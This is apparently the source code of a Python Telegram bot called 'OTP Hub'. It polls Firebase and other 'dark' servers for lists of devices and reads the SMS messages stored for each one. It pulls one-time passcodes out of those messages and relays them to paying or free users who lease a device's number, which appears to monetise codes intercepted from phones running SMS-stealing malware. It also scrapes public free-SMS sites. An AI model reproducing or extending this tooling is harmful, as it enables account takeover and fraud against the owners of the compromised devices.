import asyncio, os, time, logging, random
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

import database as db
import firebase_utils as fbu
import scraper_utils as scr

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
log = logging.getLogger("OTP-Bot")

# ================= CONFIGURATION =================
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = 8480878371
PORT = int(os.getenv("PORT", 8080))
# =================================================

router = Router()
running_bots = {}
active_scans = {}
scraper_leases = {}

class AdminStates(StatesGroup):
    add_bulk_urls = State()

# ================= CORE FUNCTIONS =================
async def get_owner_stats():
    data = db.load_data()
    fbs = data.get("firebases", [])
    
    async def fetch_single_fb(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        fb_online = 0
        fb_total = 0
        if clients and isinstance(clients, dict):
            fb_total = len(clients)
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    fb_online += 1
        return fb['label'], fb_online, fb_total

    # Fetch all URLs concurrently so it doesn't hang
    tasks = [fetch_single_fb(fb) for fb in fbs]
    results = await asyncio.gather(*tasks)
    
    total_devices, online_devices, fb_stats = 0, 0, {}
    for label, online, total in results:
        if label not in fb_stats: fb_stats[label] = {"total": 0, "online": 0}
        fb_stats[label]["total"] += total
        fb_stats[label]["online"] += online
        total_devices += total
        online_devices += online
        
    return total_devices, online_devices, fb_stats

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fbu.fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

async def send_otp_to_user(uid, service, otp, msg_text):
    otp_msg = (
        f"🔔 <b>OTP Received!</b>\n\n"
        f"📱 <b>Service:</b> {service}\n"
        f"🔑 <b>OTP:</b> {otp}\n\n"
        f"💬 <b>Msg:</b> {msg_text[:100]}..."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]])
    try:
        bot = running_bots.get(BOT_TOKEN)
        if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
    except Exception: pass

async def background_global_scanner():
    log.info("Global Scanner Started...")
    while True:
        try:
            data = db.load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            # --- Firebase/Dark Server Scanner ---
            device_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            if device_to_users:
                for fb in fbs:
                    latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                    for dev_id, msg in latest_msgs.items():
                        key = (fb["url"], dev_id)
                        msg_id = int(msg.get("id", 0))
                        old_id = active_scans.get(key, 0)
                        
                        if msg_id > old_id:
                            active_scans[key] = msg_id
                            if old_id != 0: 
                                text_content = msg.get("message", "")
                                otp = fbu.extract_otp(text_content)
                                if otp and dev_id in device_to_users:
                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        await send_otp_to_user(uid, service, otp, text_content)

            # --- Scrap Server Scanner ---
            for uid, s_data in list(scraper_leases.items()):
                if time.time() > s_data["expire_at"]:
                    del scraper_leases[uid]
                    continue
                
                msgs = await scr.get_smstome_sms(s_data["url"], s_data["phone"])
                if msgs:
                    latest_msg = msgs[0]
                    if latest_msg["message"] != s_data["last_sms"]:
                        s_data["last_sms"] = latest_msg["message"]
                        otp = fbu.extract_otp(latest_msg["message"])
                        if otp:
                            service = fbu.extract_service_name(latest_msg["message"], latest_msg["sender"])
                            await send_otp_to_user(uid, service, otp, latest_msg["message"])

            await asyncio.sleep(3)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)

# ================= KEYBOARDS =================
def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
        [InlineKeyboardButton(text="⭐ My Numbers", callback_data="user:my_numbers")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Enter as User (Test)", callback_data="user:home")],
        [InlineKeyboardButton(text="🔥 Manage Servers", callback_data="admin:manage_fb")],
        [InlineKeyboardButton(text="🤖 Manage Bots", callback_data="admin:bots")],
        [InlineKeyboardButton(text="👥 Users", callback_data="admin:users"), InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

# ================= HANDLERS =================
@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = db.load_data()
    uid = msg.from_user.id
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "starred": {}}
        db.save_data(data)
    
    if uid == data["owner_id"] or uid in data.get("admins", []):
        try: await msg.answer("⏳ <i>Loading analytics...</i>", parse_mode="HTML")
        except TelegramBadRequest: pass
        await admin_home_msg(msg)
    else:
        if not data.get("free_mode", True): return await msg.answer("⛔ Access Denied.")
        await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")

async def admin_home_msg(msg: Message):
    total, online, fbs = await get_owner_stats()
    text = (
        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
        f"🔥 <b>Total Servers:</b> {len(fbs)}\n"
        f"📱 <b>Total Devices:</b> {total}\n"
        f"🟢 <b>Online Devices:</b> {online}\n"
        f"👥 <b>Total Users:</b> {len(db.load_data().get('users', {}))}\n\n"
        f"<b>Per Server Stats:</b>\n"
    )
    for label, fstats in fbs.items():
        s_type = "🔥 Fire" if "firebaseio" in label.lower() else "🌑 Dark"
        text += f"{s_type} {label}: {fstats['online']} ON / {fstats['total']} Total\n"
    try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:home")
async def admin_home_cb(cq: CallbackQuery):
    try: await cq.message.edit_text("🔄 Refreshing live analytics...")
    except TelegramBadRequest: pass
    await admin_home_msg(cq.message)

@router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    data = db.load_data()
    fbs = data.get("firebases", [])
    if not fbs: 
        kb = [[InlineKeyboardButton(text="➕ Add Bulk URLs", callback_data="admin:add_bulk")], [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
        return await cq.message.edit_text("No servers added yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    
    kb = []
    for i, fb in enumerate(fbs):
        s_type = "🔥 Fire" if "firebaseio" in fb['url'].lower() else "🌑 Dark"
        short_url = fb['url'].split('//')[-1][:15]
        kb.append([
            InlineKeyboardButton(text=f"{s_type} {short_url}", callback_data=f"admin:viewfb:{fb['url']}"),
            InlineKeyboardButton(text="❌", callback_data=f"admin:rmfb:{fb['url']}")
        ])
    
    kb.append([InlineKeyboardButton(text="➕ Add Bulk URLs", callback_data="admin:add_bulk")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
    
    try: await cq.message.edit_text("Manage Servers (Tap ❌ to remove):", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:add_bulk")
async def admin_add_bulk_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_bulk_urls)
    await cq.message.edit_text("Send URLs in this format:\n`URL | Country Name`\n\nExample:\n`https://xyz.firebaseio.com | India`", parse_mode="Markdown")

@router.message(AdminStates.add_bulk_urls)
async def admin_add_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    text = msg.text.strip()
    added = 0
    for line in text.split("\n"):
        if "|" in line:
            parts = line.split("|")
            url = parts[0].strip()
            label = parts[1].strip()
            if url.startswith("http"):
                data["firebases"].append({"url": url, "label": label, "auth": ""})
                added += 1
    db.save_data(data)
    await msg.answer(f"✅ Added {added} servers successfully!", reply_markup=admin_kb())

@router.callback_query(F.data.startswith("admin:rmfb:"))
async def admin_rmfb(cq: CallbackQuery):
    url = cq.data.split("admin:rmfb:")[1]
    data = db.load_data()
    data["firebases"] = [f for f in data["firebases"] if f["url"] != url]
    db.save_data(data)
    await cq.answer("✅ Removed!")
    await admin_manage_fb(cq)

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    try: await cq.message.edit_text("👋 <b>Welcome!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    data = db.load_data()
    fb_countries = list(set([fb["label"] for fb in data.get("firebases", [])]))
    scraper_countries = ["United Kingdom", "United States", "Sweden", "Netherlands", "Canada"] 
    all_countries = list(set(fb_countries + scraper_countries))
    
    kb = [[InlineKeyboardButton(text=f"🏳️ {c}", callback_data=f"country:{c}")] for c in all_countries]
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text("🌍 <b>Select a Country:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("country:"))
async def user_country_selected(cq: CallbackQuery):
    country = cq.data.split(":")[1]
    data = db.load_data()
    servers = [fb for fb in data.get("firebases", []) if fb["label"] == country]
    
    kb = []
    for i, srv in enumerate(servers):
        s_type = "🔥 Fire" if "firebaseio" in srv['url'].lower() else "🌑 Dark"
        short_url = srv["url"].split("//")[-1][:15]
        kb.append([InlineKeyboardButton(text=f"{s_type} Server {i+1}", callback_data=f"server:fb:{srv['url']}")])
        
    kb.append([InlineKeyboardButton(text=f"🕸️ Scrap Server (Free)", callback_data=f"server:scr:smstome:{country}")])
    
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num")])
    try: await cq.message.edit_text(f"🌍 {country} - Select a Server:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("server:"))
async def user_server_selected(cq: CallbackQuery):
    parts = cq.data.split(":")
    srv_type = parts[1]
    uid = cq.from_user.id
    
    if srv_type == "fb":
        server_url = parts[2]
        # (Firebase device logic here - same as before)
        pass
        
    elif srv_type == "scr":
        source = parts[2]
        country = parts[3]
        
        try: await cq.message.edit_text(f"🔄 Fetching free numbers for {country} from {source}...")
        except TelegramBadRequest: pass
        
        countries_map = await scr.get_smstome_countries()
        country_url = countries_map.get(country)
        if not country_url:
            return await cq.answer("❌ Country not found on scraper.", show_alert=True)
            
        numbers = await scr.get_smstome_numbers(country_url)
        if not numbers:
            return await cq.answer("❌ No numbers available right now.", show_alert=True)
            
        kb = []
        for num in numbers[:5]:
            kb.append([InlineKeyboardButton(text=f"📞 {num}", callback_data=f"scr_sel:{num}:{country_url}")])
        
        kb.append([InlineKeyboardButton(text="🔙 Back", callback_data=f"country:{country}")])
        try: await cq.message.edit_text("Select a number to receive OTP:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
        except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("scr_sel:"))
async def scraper_number_selected(cq: CallbackQuery):
    parts = cq.data.split(":")
    number = parts[1]
    country_url = parts[2]
    uid = cq.from_user.id
    
    scraper_leases[uid] = {
        "url": country_url,
        "phone": number,
        "last_sms": "",
        "expire_at": int(time.time()) + 1200
    }
    
    text = (
        f"📱 <b>Number Selected (Scrap Server)</b>\n"
        f"🆔 <b>Number:</b> <code>{number}</code>\n\n"
        f"⌛ <i>Waiting for OTP (20 Mins)...</i>"
    )
    kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

async def main():
    log.info("Bot Started!")
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    main_bot = Bot(token=BOT_TOKEN)
    running_bots[BOT_TOKEN] = main_bot
    asyncio.create_task(background_global_scanner())
    
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(main_bot)

if __name__ == "__main__":
    asyncio.run(main())
